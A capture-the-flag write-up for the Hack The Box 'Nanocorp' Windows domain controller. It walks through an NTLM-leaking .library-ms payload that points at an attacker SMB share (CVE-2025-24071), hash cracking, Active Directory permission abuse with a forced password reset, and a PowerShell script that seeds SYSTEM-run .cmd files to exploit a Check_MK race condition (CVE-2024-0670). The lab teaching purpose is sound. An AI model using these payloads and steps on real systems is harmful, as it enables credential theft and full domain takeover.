# Hack The Box: Nanocorp Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Nanocorp-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows&logoColor=white">
  <img src="https://img.shields.io/badge/Attack-CVE--2025--24071-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/PrivEsc-CVE--2024--0670-important?style=for-the-badge">
</p>

---

# 📚 Table of Contents

* [Overview](#-overview)
* [Reconnaissance](#-reconnaissance)

  * [Port Scan](#port-scan)
  * [VHost Discovery](#vhost-discovery)
* [Initial Access: CVE-2025-24071](#-initial-access--cve-2025-24071)

  * [Vulnerability Overview](#vulnerability-overview)
  * [Crafting the Payload](#crafting-the-payload)
  * [NTLMv2 Hash Capture](#ntlmv2-hash-capture)
  * [Hash Cracking](#hash-cracking)
* [Active Directory Lateral Movement](#-active-directory-lateral-movement)

  * [BloodHound Enumeration](#bloodhound-enumeration)
  * [Kerberos Setup and Clock Skew](#kerberos-setup-and-clock-skew)
  * [Step 1: AddSelf to IT\_Support](#step-1--addself-to-it_support)
  * [Step 2: ForceChangePassword on monitoring\_svc](#step-2--forcechangepassword-on-monitoring_svc)
  * [Step 3: WinRM via Kerberos](#step-3--winrm-via-kerberos)
  * [User Flag](#user-flag)
* [Privilege Escalation: CVE-2024-0670](#-privilege-escalation--cve-2024-0670)

  * [Vulnerability Overview](#vulnerability-overview-1)
  * [Step 1: Upload RunasCs](#step-1--upload-runascs)
  * [Step 2: Seed the .cmd Files](#step-2--seed-the-cmd-files)
  * [Step 3: Trigger the MSI Repair](#step-3--trigger-the-msi-repair)
  * [Root Flag](#root-flag)
* [Conclusion](#-conclusion)
* [Tools Used](#-tools-used)
* [Key Takeaways](#-key-takeaways)

---

# 🎯 Overview

| Machine  | OS                  | Difficulty |
| -------- | ------------------- | ---------- |
| Nanocorp | Windows Server 2022 | Hard       |

**Domain:** `NANOCORP.HTB`: Domain Controller `dc01.nanocorp.htb`

## Description

This machine demonstrates:

* SMB coercion via a malicious `.library-ms` file embedded in a ZIP archive (CVE-2025-24071),
* NTLMv2 hash capture and offline cracking to obtain initial credentials,
* Active Directory exploitation through DACL abuse (AddSelf, ForceChangePassword),
* Kerberos-only authentication management for Protected Users group members,
* Local privilege escalation via the Check_MK Windows agent (CVE-2024-0670).

The foothold relies on **CVE-2025-24071**, a Windows Explorer vulnerability that triggers an outbound SMB authentication when a `.library-ms` file is parsed from a ZIP archive.

The privilege escalation relies on **CVE-2024-0670**, a race condition in the Check_MK Agent MSI repair process allowing arbitrary code execution as `SYSTEM`.

---

# 🔎 Reconnaissance

## Port Scan

Initial scan:

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.19.73
```

### Result

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS 10.0
88/tcp   open  kerberos-sec  Windows Kerberos
389/tcp  open  ldap          AD LDAP
445/tcp  open  microsoft-ds  Windows SMB
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft RPC over HTTP
636/tcp  open  ldaps         AD LDAP SSL
5986/tcp open  ssl/http      WinRM HTTPS
6556/tcp open  check-mk-agent Check_MK Agent 2.1.0p10
9389/tcp open  adws
```

### Observations

* Classic Windows Domain Controller port surface (88, 389, 445, 636).
* WinRM available on port 5986 (HTTPS): potential remote management target.
* Check_MK monitoring agent running on port 6556: version **2.1.0p10** will become significant later.
* HTTP on port 80: further enumeration required.

---

## VHost Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://nanocorp.htb -H "Host: FUZZ.nanocorp.htb" -fw 1
```

### Result

```text
[Status: 200] hire.nanocorp.htb
```

A job application portal is accessible at `hire.nanocorp.htb`. It accepts résumé uploads in ZIP format.

Add both hostnames to `/etc/hosts`:

```bash
echo "10.129.19.73  nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb" >> /etc/hosts
```

---

# 🚀 Initial Access: CVE-2025-24071

## Vulnerability Overview

**CVE-2025-24071** affects Windows Explorer's handling of `.library-ms` XML files. When a ZIP archive containing a `.library-ms` file is extracted, Windows Explorer automatically parses the file and performs an outbound SMB authentication to the UNC path embedded in its XML: leaking the current user's Net-NTLMv2 hash to a listening attacker.

The job portal at `hire.nanocorp.htb` processes uploaded ZIP archives server-side, triggering the vulnerability under the `web_svc` service account.

---

## Crafting the Payload

Create the malicious `.library-ms` file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescription>
    <simpleLocation>
      <url>\\YOUR_IP\share</url>
    </simpleLocation>
  </searchConnectorDescription>
</libraryDescription>
```

Package it into a ZIP archive:

```bash
zip resume.zip evil.library-ms
```

---

## NTLMv2 Hash Capture

Start Responder on the VPN interface before uploading:

```bash
responder -I tun0 -wv
```

Upload `resume.zip` via the application form at `hire.nanocorp.htb`.

### Result

```text
[SMB] NTLMv2 Hash captured:
web_svc::NANOCORP:<challenge>:<NTLMv2_response>:<blob>
```

Windows Explorer on the server parsed the `.library-ms` and connected back to the attacker's SMB listener, leaking the Net-NTLMv2 hash of the `web_svc` service account.

---

## Hash Cracking

Save the captured hash to a file, then crack it with Hashcat:

```bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
```

### Result

```text
web_svc::NANOCORP:...:dksehdgh712!@#
```

Credentials obtained:

```text
Username: web_svc
Password: dksehdgh712!@#
```

---

# 🔗 Active Directory Lateral Movement

## BloodHound Enumeration

Collect AD data using BloodHound:

```bash
bloodhound-python -u web_svc -p 'dksehdgh712!@#' \
  -d nanocorp.htb -dc dc01.nanocorp.htb -ns 10.129.19.73 -c All
```

### Attack Path Identified

BloodHound reveals the following DACL abuse chain:

```text
web_svc  --[AddSelf]-->  IT_Support  --[ForceChangePassword]-->  monitoring_svc
monitoring_svc  --[MemberOf]-->  Remote Management Users  (WinRM)
```

* `web_svc` can add itself to the `IT_Support` group.
* `IT_Support` has `ForceChangePassword` right over `monitoring_svc`.
* `monitoring_svc` is a member of `Remote Management Users`, granting WinRM access.

### Additional Observation

`monitoring_svc` is a member of the **Protected Users** group. This disables:

* NTLM authentication,
* RC4 Kerberos encryption.

Only AES Kerberos tickets are accepted: all authentication must go through Kerberos with AES keys.

---

## Kerberos Setup and Clock Skew

The Domain Controller clock is more than 7 hours ahead of the attack machine. Kerberos enforces a maximum 5-minute skew: all Impacket operations require clock spoofing with `faketime`.

Retrieve the DC's current time from the HTTP response header:

```bash
DC_UTC=$(TZ=UTC curl -sI http://nanocorp.htb/ | grep -i '^date:' | sed 's/Date: //')
```

Obtain a TGT for `web_svc`:

```bash
faketime "$DC_UTC" getTGT.py nanocorp.htb/web_svc:'dksehdgh712!@#' -dc-ip 10.129.19.73
export KRB5CCNAME=web_svc.ccache
```

### Result

```text
[*] Saving ticket in web_svc.ccache
```

---

## Step 1: AddSelf to IT\_Support

Use bloodyAD with Kerberos authentication to add `web_svc` to `IT_Support`:

```bash
faketime "$DC_UTC" bloodyAD -d nanocorp.htb --host dc01.nanocorp.htb \
  --dc-ip 10.129.19.73 -k add groupMember IT_Support web_svc
```

### Result

```text
[+] web_svc is now a member of IT_Support
```

---

## Step 2: ForceChangePassword on monitoring\_svc

The `IT_Support` group now grants `ForceChangePassword` over `monitoring_svc`. This is an administrative password reset and bypasses the domain's minimum password age policy.

```bash
faketime "$DC_UTC" bloodyAD -d nanocorp.htb --host dc01.nanocorp.htb \
  --dc-ip 10.129.19.73 -k set password monitoring_svc 'Passw0rd2026!X'
```

### Result

```text
[+] Password changed successfully
```

Immediately obtain a new TGT. The AES Kerberos key is derived on first authentication after the password change: do not wait:

```bash
faketime "$DC_UTC" getTGT.py nanocorp.htb/monitoring_svc:'Passw0rd2026!X' \
  -dc-ip 10.129.19.73
export KRB5CCNAME=monitoring_svc.ccache
```

### Result

```text
[*] Saving ticket in monitoring_svc.ccache
```

---

## Step 3: WinRM via Kerberos

evil-winrm is a Ruby binary. `LD_PRELOAD` with libfaketime must target the Ruby interpreter directly, not a shell alias. The `FAKETIME` value must be in the **local timezone** (CEST = DC UTC + 2 hours):

```bash
DC_CEST=$(TZ=Europe/Paris date -d "$DC_UTC" "+%Y-%m-%d %H:%M:%S")

FAKETIME="$DC_CEST" \
LD_PRELOAD="/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1" \
/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/wrappers/ruby \
/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/bin/evil-winrm \
  -i dc01.nanocorp.htb -u monitoring_svc -p 'Passw0rd2026!X' \
  -r NANOCORP.HTB -S
```

### Result

```text
*Evil-WinRM* PS C:\Users\monitoring_svc\Documents>
```

WinRM session established as `monitoring_svc`.

---

## User Flag

```bash
type C:\Users\monitoring_svc\Desktop\user.txt
```

### Result

```text
<user_flag_redacted>
```

---

# 🔺 Privilege Escalation: CVE-2024-0670

## Vulnerability Overview

The **Check_MK Agent for Windows** version ≤ 2.1.0p10 is vulnerable to a local privilege escalation.

During an MSI repair (`msiexec /fa`), a CustomAction spawns a child process that looks for a `.cmd` file in `C:\Windows\Temp` named after its own Process ID:

```text
C:\Windows\Temp\cmk_all_<PID>_<CTR>.cmd
```

where `<PID>` is the child process PID (range approximately 1000-15000) and `<CTR>` is 0 or 1.

The child process executes the `.cmd` file as **SYSTEM** if found. `BUILTIN\Users` has write access to `C:\Windows\Temp`, so it is possible to pre-seed files for all plausible PIDs. Marking each file **read-only** prevents the CustomAction from overwriting the payload before executing it.

### Additional Constraints

`monitoring_svc` is in the **Protected Users** group:

* RunasCs with default logon type 2 (interactive) is blocked: Protected Users blocks NTLM interactive logon.
* `msiexec /fa` invoked directly from a WinRM session (Type 3 network logon) fails with error **1601**: the Windows Installer service rejects non-interactive sessions.

**Solution:** RunasCs with `-l 9` (LOGON32_LOGON_NEW_CREDENTIALS) creates a process context the Installer service accepts, bypassing both restrictions.

The Check_MK service MSI product code and installer path:

```text
Product code : {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
MSI path     : C:\Windows\Installer\1e6f2.msi
Service name : CheckmkService (runs as LocalSystem)
```

---

## Step 1: Upload RunasCs

RunasCs is available locally at `/opt/resources/windows/SharpCollection/NetFramework_4.7_x64/RunasCs.exe`.

evil-winrm concatenates Windows path separators when a remote path is specified inside Docker. Upload without a remote path, then move:

```text
*Evil-WinRM* PS > upload RunasCs.exe
*Evil-WinRM* PS > Move-Item .\RunasCs.exe C:\Windows\Temp\RunasCs.exe -Force
```

---

## Step 2: Seed the .cmd Files

Create a seeding script locally:

```powershell
# seed.ps1
$payload = "copy C:\Users\Administrator\Desktop\root.txt C:\Users\monitoring_svc\Desktop\root.txt`r`n" +
           "icacls C:\Users\monitoring_svc\Desktop\root.txt /grant Everyone:F"
$count = 0
for ($num = 1000; $num -le 15000; $num++) {
    foreach ($ctr in 0,1) {
        $path = "C:\Windows\Temp\cmk_all_${num}_${ctr}.cmd"
        try {
            [System.IO.File]::WriteAllText($path, $payload)
            $fi = [System.IO.FileInfo]::new($path)
            $fi.IsReadOnly = $true
            $count++
        } catch {}
    }
}
Write-Host "Seeded $count files"
```

> **Important:** The script must be uploaded as a file and run with `-File`, not pasted inline. evil-winrm sends multiline input line by line; PowerShell interprets each line as a separate command and fails with "Missing closing '}'".

Upload and run:

```text
*Evil-WinRM* PS > upload seed.ps1
*Evil-WinRM* PS > Move-Item .\seed.ps1 C:\Windows\Temp\seed.ps1 -Force
*Evil-WinRM* PS > powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\seed.ps1
```

### Result

```text
Seeded 14003 files
```

14 003 read-only `.cmd` files covering all plausible PIDs are now present in `C:\Windows\Temp`.

---

## Step 3: Trigger the MSI Repair

Invoke `msiexec /fa` through RunasCs with logon type 9:

```text
*Evil-WinRM* PS > cmd /c "C:\Windows\Temp\RunasCs.exe" monitoring_svc "Passw0rd2026!X" ^
  "msiexec.exe /fa {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D} /qn" -l 9 -t 120000
```

### Result

```text
No output received from the process.
```

No output from `msiexec /qn` is expected on success. The CustomAction found one of the pre-seeded read-only `.cmd` files and executed it as SYSTEM, copying `root.txt` to a world-readable location.

---

## Root Flag

```text
*Evil-WinRM* PS > type C:\Users\monitoring_svc\Desktop\root.txt
```

### Result

```text
<root_flag_redacted>
```

---

# 🧠 Conclusion

This machine demonstrates a complete attack chain on a Windows Active Directory environment:

1. VHost enumeration reveals a job application portal that processes ZIP uploads.
2. CVE-2025-24071 exploits Windows Explorer's automatic parsing of `.library-ms` files to leak a Net-NTLMv2 hash via SMB coercion.
3. Offline hash cracking yields plaintext credentials for the `web_svc` service account.
4. BloodHound maps a DACL abuse path: `web_svc → IT_Support → monitoring_svc → WinRM`.
5. bloodyAD executes AddSelf and ForceChangePassword over Kerberos (NTLM is blocked for Protected Users members).
6. Clock skew management with `faketime` and `libfaketime` is required throughout: the DC is 7+ hours ahead.
7. CVE-2024-0670 races the Check_MK MSI repair CustomAction by pre-seeding 14 000+ SYSTEM-executable `.cmd` files.
8. RunasCs with `-l 9` (LOGON_NEW_CREDENTIALS) bypasses the dual restriction imposed by the Protected Users group and the WinRM network logon type.

---

# 🛠️ Tools Used

* Nmap
* ffuf
* Responder
* Hashcat
* BloodHound / bloodhound-python
* bloodyAD
* Impacket (getTGT.py)
* faketime / libfaketime
* evil-winrm
* RunasCs

---

# 📌 Key Takeaways

* ZIP file upload endpoints can trigger SMB coercion when the server processes `.library-ms` files: validate and strip all non-document content from uploaded archives.
* The Protected Users group blocks NTLM and RC4 Kerberos but does not block Kerberos AES authentication: it provides partial, not full, protection.
* ForceChangePassword via LDAP bypasses the domain minimum password age policy and forces immediate AES key regeneration on next TGT issuance.
* Kerberos clock skew must be managed per-tool: Impacket tools use `faketime` against system time; Ruby-based tools (evil-winrm) require `LD_PRELOAD` with libfaketime on the full Ruby binary path, with time expressed in local timezone.
* CVE-2024-0670 is a race condition exploitable entirely from an unprivileged WinRM session: no SeImpersonatePrivilege or scheduler access required.
* The Windows Installer service rejects `msiexec /fa` from Type 3 (network) logon sessions; RunasCs `-l 9` (LOGON_NEW_CREDENTIALS) is required to create a compatible process context.
* Always mark pre-seeded race condition files as read-only to prevent the target process from overwriting them before execution.

---

*Writeup by Jean-Michel Leclercq: solved on 2026-06-20*
